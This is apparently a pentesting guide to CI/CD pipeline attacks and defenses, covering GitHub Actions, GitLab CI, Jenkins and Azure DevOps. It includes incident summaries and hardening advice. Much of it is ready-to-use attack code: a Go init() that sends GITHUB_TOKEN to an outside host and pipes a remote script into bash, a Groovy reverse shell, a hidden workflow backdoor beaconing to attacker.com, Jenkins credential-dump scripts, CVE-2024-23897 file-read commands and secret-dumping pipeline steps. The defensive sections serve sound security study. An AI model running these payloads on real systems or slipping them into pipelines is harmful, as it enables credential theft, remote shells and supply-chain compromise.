# CI/CD Security: Extended Attack & Defense Guide

Security testing for Continuous Integration and Continuous Deployment pipelines.


---

## Attack Surface

```
CI/CD systems are high-value targets because they:
- Have access to source code
- Store secrets (API keys, credentials)
- Can deploy to production
- Often have elevated cloud permissions
- Trust code from repositories
```

---

## GitHub Actions

### The hackerbot-claw Campaign (February 2026)

In February 2026, an autonomous bot named `hackerbot-claw` exploited insecure GitHub Actions configurations across multiple high-profile repositories including `avelino/awesome-go` (140,000+ stars), Microsoft AI repositories, and DataDog projects . The campaign demonstrated that manual oversight is no longer an effective defense against autonomous, continuous CI/CD exploitation .

**How the Attack Worked:**

The bot executed fully automated reconnaissance, trigger creation, code execution, payload delivery, and credential exfiltration without human intervention .

**Step 1 - Reconnaissance:** The bot scanned public repositories for:
- `pull_request_target` workflows that check out fork code
- `issue_comment` triggers without authorization checks
- `${{ }}` expressions interpolated into shell commands
- Overly broad `GITHUB_TOKEN` permissions 

**Step 2 - Trigger Creation:** The bot opened benign-looking pull requests with malicious payloads embedded in:
- A Go `init()` function
- A branch name
- A filename
- A modified script
- An AI prompt file 

**Step 3 - Code Execution:** Because `pull_request_target` runs in the context of the target repository, it executes with trusted privileges while checking out attacker-controlled code .

**Step 4 - Second-Stage Payload:** All attacks called back to `hackmoltrepeat.com/molt` to deliver second-stage scripts .

**Step 5 - Credential Exfiltration:** The bot exfiltrated `GITHUB_TOKEN` and Personal Access Tokens (PATs) to `recv.hackmoltrepeat.com`. Stolen tokens were used to push commits, delete releases, modify repositories, and alter workflows .

**The awesome-go Exploit:**

The workflow in `avelino/awesome-go` used `pull_request_target` and checked out fork code, running with target repository permissions but executing attacker-controlled code. The attacker modified a Go script to include:

```go
func init() {
    token := os.Getenv("GITHUB_TOKEN")
    repo := os.Getenv("GITHUB_REPOSITORY")
    http.Post("https://recv.hackmoltrepeat.com", "application/json", 
        strings.NewReader(`{"token":"`+token+`","repo":"`+repo+`"}`))
    exec.Command("sh", "-c", "curl -s https://hackmoltrepeat.com/molt | bash").Run()
}
```

This exfiltrated the `GITHUB_TOKEN` and downloaded a second-stage payload. With a write-scoped token, the attacker could push directly to `main`, modify workflows, merge malicious PRs, and persist access .

### Secrets Extraction

```yaml
# Secrets accessible via ${{ secrets.NAME }}
# Check for exposed secrets in logs

steps:
  - name: Expose secrets (malicious)
    run: |
      echo "${{ secrets.AWS_ACCESS_KEY }}" | base64
      env | base64
      cat $GITHUB_ENV
```

**Real-World Example - CodeQLEAKED (2024):** Praetorian researchers discovered that a GitHub Actions workflow in the CodeQL repository briefly exposed a GitHub token within a debug artifact. Despite its short lifespan, the token had write permissions, allowing repository compromise and highlighting serious supply chain risks .

### GITHUB_TOKEN Abuse

```bash
# GITHUB_TOKEN has repo access by default
# Can be used for:
# - Push to repo (if not protected)
# - Create issues/PRs
# - Access private packages
# - Read other private repos (in org)

# Check permissions
curl -H "Authorization: token $GITHUB_TOKEN" \
  https://api.github.com/repos/owner/repo

# Exfiltrate repo content
git clone https://x-access-token:${GITHUB_TOKEN}@github.com/org/private-repo.git
```

### ArtiPACKED Attack - CVE-2026-40313

A critical vulnerability discovered in PraisonAI (versions 4.5.139 and below) demonstrated the ArtiPACKED attack vector. The GitHub Actions workflows were vulnerable because `actions/checkout` was used without setting `persist-credentials: false` .

**Vulnerability Details:** By default, `actions/checkout` writes the `GITHUB_TOKEN` (and sometimes `ACTIONS_RUNTIME_TOKEN`) into the `.git/config` file for persistence. If any subsequent workflow step uploads artifacts (build outputs, logs, test results, etc.), these tokens can be inadvertently included. Since PraisonAI was a public repository, any user with read access could download these artifacts and extract the leaked tokens .

**Impact:** Attackers could push malicious code, poison releases and PyPI/Docker packages, steal repository secrets, and execute a full supply chain compromise affecting all downstream users .

**Fix:** The issue was fixed in version 4.5.140 by setting `persist-credentials: false` in checkout actions .

### Self-Hosted Runner Exploitation

```yaml
# Self-hosted runners may have:
# - Access to internal network
# - Cached credentials
# - Persistent storage between jobs

steps:
  - name: Explore runner
    run: |
      # Check for cached credentials
      find /home -name "*.pem" -o -name "credentials" 2>/dev/null
      cat ~/.aws/credentials
      cat ~/.docker/config.json
      
      # Network enumeration
      ip addr
      cat /etc/hosts
      nmap -sn 10.0.0.0/24
```

**Real-World Example - TensorFlow Supply Chain Compromise (2024):** Praetorian researchers identified a misconfiguration in the TensorFlow repository that could allow an external attacker to compromise the repository's self-hosted runners. An attacker could steal secrets through runner post-exploitation and workflow runtime tampering, leading to a full-scale supply chain attack .

### Poisoned Pipeline Execution (PPE)

```
Direct PPE: Attacker modifies workflow file
Indirect PPE: Attacker modifies code that workflow executes

Attack vectors:
1. Compromised PR from fork
2. Compromised dependency
3. Injected build scripts
```

**Real-World Example - PostHog Shai-Hulud 2.0 Worm (2025):** In November 2025, PostHog experienced its largest security incident when a malicious pull request triggered an automation script that ran with full project privileges. Because the workflow blindly executed code from the attacker's branch, the intruder seized control and exfiltrated a bot's personal access token with write permissions across the organization .

**Worm Propagation:** The contaminated packages (posthog-node, posthog-js, posthog-react-native) contained a pre-install script that ran automatically when installed. This script ran TruffleHog to scan for credentials, exfiltrated found secrets to new public GitHub repositories, then used stolen npm credentials to publish further malicious packages. More than 25,000 developers had their secrets compromised within three days .

---

## GitLab CI

### CI_JOB_TOKEN Abuse - CVE-2024-6389

A critical vulnerability in GitLab (CVE-2024-6389) allowed the `CI_JOB_TOKEN` to be used to obtain GitLab session tokens . This meant that a CI job token, which should have limited permissions, could be escalated to gain full user session access.

**Additional GitLab Vulnerabilities (2024-2025):** Recent security research has revealed multiple CI/CD attack vectors in GitLab :

| Vulnerability | Impact |
|---------------|--------|
| CI_JOB_TOKEN can obtain GitLab session token | Session hijacking, account takeover |
| Exposure of protected and masked CI/CD variables via on-demand DAST | Secret leakage |
| Credentials disclosed when repository mirroring fails | Credential theft |
| Dependency Proxy credentials logged in plaintext in graphql logs | Credential exposure |
| Group Developers can view group runners information | Information disclosure |
| Variables from settings not overwritten by PEP when template is included | Variable injection |

### Variable Extraction

```yaml
# .gitlab-ci.yml
stages:
  - exploit

dump_vars:
  stage: exploit
  script:
    - printenv | base64
    - cat $CI_PROJECT_DIR/.gitlab-ci.yml
    - echo $CI_JOB_TOKEN
```

### Runner Token Abuse

```bash
# CI_JOB_TOKEN can:
# - Clone repos in same group
# - Push to container registry
# - Access package registry

# Clone private repo
git clone https://gitlab-ci-token:${CI_JOB_TOKEN}@gitlab.com/group/private-repo.git

# Push to registry
docker login -u gitlab-ci-token -p $CI_JOB_TOKEN registry.gitlab.com
docker push registry.gitlab.com/group/project/image:tag
```

### Protected vs Unprotected Variables

```yaml
# Protected variables only available on protected branches
# Test from unprotected branch to see what's accessible

test:
  script:
    - echo "Protected var: $PROD_API_KEY"  # May be empty
    - echo "Unprotected var: $DEV_API_KEY"  # Accessible
```

---

## Jenkins

### CVE-2024-23897: Jenkins Arbitrary File Read to RCE

**Affected Versions:** Jenkins 2.441 and earlier, Jenkins LTS 2.426.2 and earlier
**Fixed in:** Jenkins 2.442, Jenkins LTS 2.426.3 

**Description:** This critical vulnerability allowed unauthenticated attackers to read arbitrary files on the Jenkins controller file system. The vulnerability exists because Jenkins does not disable a feature of its CLI command parser that replaces an '@' character followed by a file path with the file's contents .

**Root Cause:** The vulnerability stems from the `expandAtFiles()` function in the `org.kohsuke.args4j.CmdLineParser` class. When parsing CLI arguments, if the parser encounters an '@' symbol followed by a file path, it reads and expands the content of that file .

**Exploitation:**

```bash
# Read arbitrary files without authentication
java -jar jenkins-cli.jar -s http://target-jenkins-server:8080/ help @/etc/passwd

# Read the initial admin password
java -jar jenkins-cli.jar -s http://target-jenkins:8080/ help @/var/jenkins_home/secrets/initialAdminPassword

# HTTP-based exploitation
curl 'http://jenkins:8080/cli?remoting=false' \
  -H 'Content-type: application/octet-stream' \
  --data-binary '@payload.bin'
```

**File Read Limitations:**
- Without authentication: Only first 3 lines of the file can be read (depending on CLI command)
- With 'Overall/Read' permission: Full file content can be read
- Binary files can be extracted but may be affected by encoding issues 

**Escalation to RCE:**

Once file read is achieved, attackers can escalate to remote code execution:

1. Extract Credentials:
   - Read `/var/jenkins_home/credentials.xml` for encrypted credentials
   - Read `/var/jenkins_home/secrets/master.key` and `hudson.util.Secret` for decryption
   - Decrypt credentials using Jenkins script console:
     ```groovy
     println(Hudson.util.Secret.fromString("{XXX=}").getPlainText())
     ```

2. Forge "Remember-me" cookies for administrative access

3. Execute arbitrary code through Resource Root URL, XSS, or CSRF vectors 

**Real-World Exploitation:** This vulnerability has been actively exploited in the wild, added to CISA Known Exploited Vulnerabilities (KEV) catalog, used by ransomware gangs (RansomEXX) to compromise infrastructure, and exploited by threat actor IntelBroker to steal GitHub repositories and compromise IT service providers .

**Detection:**

```bash
# Splunk detection query
index=web uri="/cli?remoting=false" http_method=POST http_status=200

# Look for payload patterns containing @/path/to/file
```

**Mitigation:**
- Upgrade to Jenkins 2.442 or LTS 2.426.3+
- Disable Jenkins CLI access if immediate patching is not possible
- Set Java system property: `hudson.cli.CLICommand.allowAtSyntax=false`
- Restrict network access to Jenkins admin interface 

### Script Console RCE

```groovy
// If you have access to /script console
// Full Groovy execution

def cmd = "id"
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout\nerr> $serr"

// Reverse shell
def cmd = ["/bin/bash", "-c", "bash -i >& /dev/tcp/attacker/4444 0>&1"]
cmd.execute()
```

### Credentials Extraction

```groovy
// Dump all credentials from Jenkins
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.impl.*

def creds = CredentialsProvider.lookupCredentials(
    com.cloudbees.plugins.credentials.common.StandardUsernameCredentials.class,
    Jenkins.instance,
    null,
    null
)

for (c in creds) {
    println(c.id + ": " + c.username + " / " + c.password)
}
```

### Pipeline Secrets in Logs

```groovy
// Secrets may leak in build logs
pipeline {
    agent any
    environment {
        SECRET = credentials('secret-id')
    }
    stages {
        stage('Build') {
            steps {
                // This may print masked secret
                sh 'echo $SECRET'
                // This may leak it
                sh 'printenv | grep -i secret'
            }
        }
    }
}
```

### Node.js Jenkins Attack (April 2025)

A security researcher uncovered a critical vulnerability in the Node.js CI/CD pipeline that allowed remote code execution on internal Jenkins agents. The attack stemmed from how Node.js orchestrated workflows using GitHub Actions, Jenkins, and a custom GitHub App .

**The Attack Vector:** The flaw allowed a threat actor to smuggle unreviewed code into Jenkins pipelines by forging Git commit timestamps—tricking the system into believing that malicious commits occurred before maintainers had approved the pull request. This desynchronization between platforms opened the door to persistent code execution, potential lateral movement, and exfiltration of Jenkins credentials .

**Exploitation Steps:**
1. Submit a legitimate pull request
2. Wait for the required labels and approval
3. Push a forged-timestamp commit containing a malicious payload
4. The payload modified build scripts to install a rogue GitHub Actions runner connected to the attacker's repository
5. This gave persistent access to over a dozen Jenkins agents 

---

## Azure DevOps

### Service Connection Abuse

```yaml
# If pipeline has access to service connections
# Can deploy/access cloud resources

- task: AzureCLI@2
  inputs:
    azureSubscription: 'Production'
    scriptType: 'bash'
    scriptLocation: 'inlineScript'
    inlineScript: |
      az account show
      az keyvault secret list --vault-name prod-vault
```

**Azure Sentinel Detection:** According to ATT&CK mapping T1195.001, Azure Sentinel provides hunting queries to identify potentially malicious changes to Azure DevOps project resources :

| Detection Query | Purpose |
|-----------------|---------|
| "Azure DevOps - Project Visibility changed to public" | Detect exposure of private projects |
| "AzureDevops Service Connection Abuse" | Detect malicious behavior with service connections |
| "External Upstream Source added to Azure DevOps" | Detect potential build pipeline compromise |
| "Azure DevOps Pipeline modified by a New User" | Detect unauthorized pipeline modifications |
| "New Agent Added to Pool by New User or a New OS" | Detect suspicious agent additions  |

### Agent Exploitation

```yaml
# Self-hosted agents may have cached credentials
steps:
  - script: |
      cat ~/.azure/credentials
      cat ~/.kube/config
      env | grep -i azure
```

---

## Artifact Poisoning

### Dependency Confusion

```bash
# Register internal package names on public registry
# When CI runs `npm install`, it may fetch malicious public package

# Check for vulnerable packages
# 1. Find internal package names (package.json, requirements.txt)
# 2. Check if name exists on public registry
# 3. If not, register it with malicious code
```

**Real-World Example - CloudImposer (Google Cloud Platform, 2024):** Tenable discovered a dependency confusion attack method, dubbed CloudImposer, that could have exposed Google Cloud Platform customers to remote code execution attacks. GCP's App Engine, Cloud Functions, and Cloud Composer services were affected .

**Root Cause:** The use of the `--extra-index-url` argument in Python, which instructs applications to look for private dependencies in the public registry (PyPI), in addition to the specified private registry. The `pip` package installer prioritizes the package with the higher versioning number when encountering two packages with the same name .

**The Attack:** After identifying a referenced package that was not present in the public registry, Tenable created their own package with the same name, uploaded it to PyPI, and launched the dependency confusion attack against Cloud Composer, Google's managed service version of Apache Airflow. They successfully verified that the PoC resulted in the execution of code on Google's internal servers .

**Google's Response:** Google classified this as an RCE bug, patched it immediately, and updated GCP documentation to remove the recommendation to use `--extra-index-url`, replacing it with `--index-url` (which only looks for packages in defined registries) .

### Build Cache Poisoning

```yaml
# If build cache is shared between projects
# Poisoned cache can inject malicious artifacts

# Example: npm cache poisoning
- name: Setup Node with cache
  uses: actions/setup-node@v3
  with:
    cache: 'npm'  # Shared cache may be poisoned
```

---

## Container Registry Attacks

```bash
# Push malicious image to internal registry
# If CI pulls by tag (not digest), can be replaced

# Push malicious image
docker tag malicious:latest registry.internal.com/app:v1.0
docker push registry.internal.com/app:v1.0

# CI job pulls compromised image
docker pull registry.internal.com/app:v1.0
```

---

## Post-Exploitation

### Lateral Movement

```bash
# From compromised CI runner:

# Find other repos/projects
curl -H "Authorization: token $GITHUB_TOKEN" \
  "https://api.github.com/orgs/company/repos?type=all"

# Access cloud resources
aws sts get-caller-identity
az account list
gcloud projects list

# Pivot to internal services
nmap -sn 10.0.0.0/24
curl http://internal-service.local/
```

### Persistence

```yaml
# Add backdoor to workflow
# Hidden in test or setup step

- name: Setup environment
  run: |
    # Legitimate setup
    npm install
    
    # Hidden backdoor
    curl -s https://attacker.com/beacon?repo=$GITHUB_REPOSITORY &
```

---

## Detection & Defense

### Monitor For:
1. Unusual secrets access patterns
2. Modified workflow files
3. New self-hosted runners
4. Unexpected network connections from runners
5. Build artifact changes
6. Service connection usage spikes
7. Suspicious `@/path/to/file` patterns in CLI requests (Jenkins)
8. Pull requests modifying CI/CD workflows
9. `pull_request_target` workflows checking out fork code without review 

### Hardening Best Practices (Based on Real Incidents)

**From the hackerbot-claw Campaign:**
- Never use `pull_request_target` without additional safeguards
- Never interpolate `${{ github.event.pull_request.title }}` or other PR-controlled values directly into `run:` commands
- Always sanitize branch names, filenames, and PR metadata before using in shell commands
- Set minimal `GITHUB_TOKEN` permissions using `permissions:` block 

**From the ArtiPACKED Vulnerability (CVE-2026-40313):**
- Always set `persist-credentials: false` in `actions/checkout` steps
- Never upload artifacts containing tokens or credentials
- Use dedicated artifact upload steps with explicit include/exclude patterns 

**From the PostHog Shai-Hulud 2.0 Incident:**
- Adopt a "trusted publisher" model for package releases
- Never run untrusted code from pull requests with write privileges
- Disable install-script execution in CI/CD pipelines
- Require manual approval for workflow changes 

**From the CloudImposer Attack:**
- Use `--index-url` instead of `--extra-index-url` when installing private dependencies
- Implement package version pinning and verification
- Monitor for typosquatting and dependency confusion attempts 

**From CVE-2024-23897 (Jenkins):**
- Keep Jenkins updated to the latest patched version
- Disable CLI access if not required
- Restrict network access to Jenkins admin interface
- Monitor for suspicious CLI requests 

---

## Tools

```bash
# CI/CD attack tools

# GATO (Github Attack ToolKit) - GitHub Actions exploitation
# Identifies and exploits misconfigurations in GitHub Actions workflows
# Supports mapping pipelines, privilege escalation, and secrets extraction
https://github.com/AhmedMohamedDev/gato

# Glato (GitLab Attack ToolKit) - GitLab exploitation (BlackHat 2025 release)
# Similar functionality for GitLab CI/CD pipelines

# nord-stream - GitLab/GitHub secrets extraction
https://github.com/AhmedMohamedDev/nord-stream

# pwn-pipeline - Pipeline exploitation
https://github.com/AhmedMohamedDev/pwn-pipeline

# GitPhish - Automates GitHub OAuth device code phishing
# Demonstrates how attackers can trick users into granting token-based access

# Nosey Parker - Secrets scanner
# Scans files and Git history for secrets like credentials and API keys

# Nuclei CI/CD templates
nuclei -t http/exposures/configs/jenkins-config.yaml

# CVE-2024-23897 Jenkins Scanner
# Use the public PoC to test for Jenkins file read vulnerability
https://github.com/vmc8ll/poc-CVE-2024-23897
```

---

## Related Topics

* [GitLab](https://www.pentest-book.com/enumeration/webservices/gitlab) - GitLab specific attacks
* [Supply Chain](https://www.pentest-book.com/enumeration/web/supply-chain) - Dependency attacks (including Dependency Confusion)
* [Cloud](https://www.pentest-book.com/enumeration/cloud) - CI/CD often has cloud access
* [Jenkins Hardening](https://www.jenkins.io/doc/book/security/) - Official Jenkins security guide
